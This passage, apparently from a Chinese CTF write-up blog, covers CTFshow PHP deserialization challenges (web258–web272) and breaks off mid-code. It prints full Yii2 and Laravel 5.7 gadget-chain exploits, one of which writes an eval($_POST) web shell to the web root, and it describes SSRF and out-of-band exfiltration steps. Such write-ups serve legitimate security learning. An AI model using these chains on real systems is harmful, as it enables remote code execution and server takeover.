+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152136296.png" alt="image-20221216152136296"></p>
+<p>然后编码直接执行就能rce</p>
+<p>它这个+绕过原理是什么呢</p>
+<p>这个牵扯到php底层 看一下它的c代码</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152147472.png" alt="image-20221216152147472"></p>
+<p>这是定义反序列化</p>
+<p>找到这里</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152153516.png" alt="image-20221216152153516"></p>
+<p>如果前面有+的话 会走到19 但是19是可以进行序列化的</p>
+<h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152215197.png" alt="image-20221216152215197"></p>
+<p>flag.php</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152220836.png" alt="image-20221216152220836"></p>
+<p>直接将参数vip进行反序列化 然后调用getFlag这个方法 但是这里没有getFlag这个方法 这里可以通过php的一个机制</p>
+<p>如果调用未知的一个方法，会默认调用当前类的call方法  考虑到原生类的ssrf</p>
+<p>主要利用的是php原生类SoapClient</p>
+<p>该类的构造函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先本地测试一下</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152230327.png" alt="image-20221216152230327"></p>
+<p>本地nc监听</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152237098.png" alt="image-20221216152237098"></p>
+<p>这些地方都是我们可以控制的 也就是我们可以进行伪造</p>
+<p>按照flag.php的要求去伪造</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152242685.png" alt="image-20221216152242685"></p>
+<p>继续监听</p>
+<p>可以看到已经注入</p>
+<p>将$client序列化一下 然后编码传入</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152252171.png" alt="image-20221216152252171"></p>
+<p>再访问&#x2F;flag.txt拿到flag</p>
+<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152258679.png" alt="image-20221216152258679"></p>
+<p>意思你序列化之后出来的东西需要包含   &#x2F;ctfshow_i_love_36D&amp;#x20;</p>
+<p>直接传ctfshow&#x3D;ctfshow_i_love_36D&amp;#x20;</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152304748.png" alt="image-20221216152304748"></p>
+<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152319732.png" alt="image-20221216152319732"></p>
+<p>首先我们要清楚</p>
+<p>如果类中同时定义了 <strong>unserialize() 和</strong> wakeup() 两个魔术方法，则只有__ unserialize() 方法会生效，__ wakeup() 方法会被忽略。</p>
+<p>反序列化的会进入__unserialize中 没有什么方法走到__invoke中 所以就直接考虑写文件</p>
+<p>这里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;code==0x36d)&#123;</span><br><span class="line">            file_put_contents($this-&gt;username, $this-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要满足code等于0x36d就可以 这里是&#x3D;&#x3D;(php弱类型比较) 将0x36d转换为数字是877 877.php&#x3D;877.php是成立的</p>
+<p>code是由username和password拼接成的 只要username&#x3D;877.php password&#x3D;shell就可以</p>
+<p>构造payload</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152330873.png" alt="image-20221216152330873"></p>
+<p>马子写进去之后 蚁剑连接 根目录下找到flag</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152336944.png" alt="image-20221216152336944"></p>
+<h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152343373.png" alt="image-20221216152343373"></p>
+<p>这道题是考察反序列化字符串逃逸 大师傅在题目中留下了hint</p>
+<p>在这</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152355553.png" alt="image-20221216152355553"></p>
+<p>访问&#x2F;message.php</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152402115.png" alt="image-20221216152402115"></p>
+<p>当token&#x3D;admin时 打印flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下面说一下字符串逃逸过程</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152409902.png" alt="image-20221216152409902"></p>
+<p>序列化结果</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152416258.png" alt="image-20221216152416258"></p>
+<p>触发过滤规则</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152425957.png" alt="image-20221216152425957"></p>
+<p>构造payload 结合上面那个要求 token&#x3D;admin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就开始字符串逃逸</p>
+<p>payload的长度是62位</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152433823.png" alt="image-20221216152433823"></p>
+<p>序列化</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152440526.png" alt="image-20221216152440526"></p>
+<p>刚好311位 再进行反序列化</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152447244.png" alt="image-20221216152447244"></p>
+<p>逃逸成功</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152452721.png" alt="image-20221216152452721"></p>
+<p>得到flag</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152459279.png" alt="image-20221216152459279"></p>
+<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>session反序列化</p>
+<p>打开是个登录框，搞了半天没啥结果，直接扫描一下目录</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152511310.png" alt="image-20221216152511310"></p>
+<p>下载源码</p>
+<p>关键代码   index.php  写入cookie</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152517686.png" alt="image-20221216152517686"></p>
+<p>check.php  调用cookie</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152524406.png" alt="image-20221216152524406"></p>
+<p>inc.php 存在写文件函数&amp;#x20;</p>
+<p>如果username为php文件名 password为一句话就能rce了</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152530577.png" alt="image-20221216152530577"></p>
+<p>构造payload</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152536304.png" alt="image-20221216152536304"></p>
+<p>执行过程</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152542279.png" alt="image-20221216152542279"></p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152551669.png" alt="image-20221216152551669"></p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152558936.png" alt="image-20221216152558936"></p>
+<p>成功rce</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152605608.png" alt="image-20221216152605608"></p>
+<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152612336.png" alt="image-20221216152612336"></p>
+<p>应该也是字符串逃逸 和web262挺像的 只不过是把$_COOKIE换成了$_ SESSION</p>
+<p>session是不可控的</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152619044.png" alt="image-20221216152619044"></p>
+<p>这里为loveU 但是长度为4 可以看到已经逃逸</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152625875.png" alt="image-20221216152625875"></p>
+<p>我们需要的payload是</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152631982.png" alt="image-20221216152631982"></p>
+<p>替换之后</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152637245.png" alt="image-20221216152637245"></p>
+<p>写入</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152644122.png" alt="image-20221216152644122"></p>
+<p>再访问message.php 注意在cookie处加上msg&#x3D;xxx</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152651022.png" alt="image-20221216152651022"></p>
+<h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152708033.png" alt="image-20221216152708033"></p>
+<p>考察php按地址传参</p>
+<p>两个参数 这个token是要一个随机的md5值 显然我们是控制不了的 所以只能控制$password和$token相等</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152713469.png" alt="image-20221216152713469"></p>
+<p>这里就相当于在定义$password这个参数时直接指向token</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152720291.png" alt="image-20221216152720291"></p>
+<p>下面相当于内存地址</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152726720.png" alt="image-20221216152726720"></p>
+<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152731676.png" alt="image-20221216152731676"></p>
+<p>现在这个情况 是需要绕过最后两行的正则 如果序列化的字符串里有ctfshow就会抛出一个异常</p>
+<p>然后销毁程序从而触发__destruct方法&amp;#x20;</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152738019.png" alt="image-20221216152738019"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152745909.png" alt="image-20221216152745909"></p>
+<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152751777.png" alt="image-20221216152751777"></p>
+<p>弱口令admin admin登录</p>
+<p>查看源码发现是yii2.0框架</p>
+<p>这个框架网上有流传出的反序列化链子 直接用就行 只要找到入口</p>
+<p>查看源码</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152757787.png" alt="image-20221216152757787"></p>
+<p>访问找到</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152803478.png" alt="image-20221216152803478"></p>
+<p>链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;phpinfo&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;1&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\db&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader = new Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    echo base64_encode(serialize(new yii\db\BatchQueryResult));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后直接执行就可以 成功rce</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152812456.png" alt="image-20221216152812456"></p>
+<p>接下来找flag就好 写shell拿flag</p>
+<p>由于没有回显 所以只能先外带一下数据</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152819171.png" alt="image-20221216152819171"></p>
+<p>已经外带到了数据</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152827155.png" alt="image-20221216152827155"></p>
+<p>查看当前目录然后写shell 这里需要base64加密一下 要不然读不到数据</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152833407.png" alt="image-20221216152833407"></p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152839882.png" alt="image-20221216152839882"></p>
+<p>写shell</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152845845.png" alt="image-20221216152845845"></p>
+<p>成功rce</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152854413.png" alt="image-20221216152854413"></p>
+<h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>也是yii2框架反序列化 换条链子打就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &#x27;echo &quot;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>yii框架&amp;#x20;</p>
+<p>用的还是上一条链子</p>
+<h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>同一条链子</p>
+<h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>laravel5.7反序列化漏洞</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Foundation\Testing &#123;</span><br><span class="line">    class PendingCommand</span><br><span class="line">    &#123;</span><br><span class="line">        public $test;</span><br><span class="line">        protected $app;</span><br><span class="line">        protected $command;</span><br><span class="line">        protected $parameters;</span><br><span class="line"></span><br><span class="line">        public function __construct($test, $app, $command, $parameters)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser</span><br><span class="line">            $this-&gt;app = $app;                   //一个实例化的类 Illuminate\Foundation\Application</span><br><span class="line">            $this-&gt;command = $command;           //要执行的php函数 system</span><br><span class="line">            $this-&gt;parameters = $parameters;     //要执行的php函数的参数  array(&#x27;id&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker &#123;</span><br><span class="line">    class DefaultGenerator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $default;</span><br><span class="line"></span><br><span class="line">        public function __construct($default = null)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Foundation &#123;</span><br><span class="line">    class Application</span><br><span class="line">    &#123;</span><br><span class="line">        protected $instances = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($instances = [])</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;instances[&#x27;Illuminate\Contracts\Console\Kernel&#x27;] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $defaultgenerator = new Faker\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;));</span><br><span class="line"></span><br><span class="line">    $app = new Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    $application = new Illuminate\Foundation\Application($app);</span><br><span class="line"></span><br><span class="line">    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#x27;system&#x27;, array(&#x27;whoami&#x27;));</span><br><span class="line"></span><br><span class="line">    echo urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功rce</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152908248.png" alt="image-20221216152908248"></p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152914683.png" alt="image-20221216152914683"></p>
+<h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>laravel5.8反序列化漏洞</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 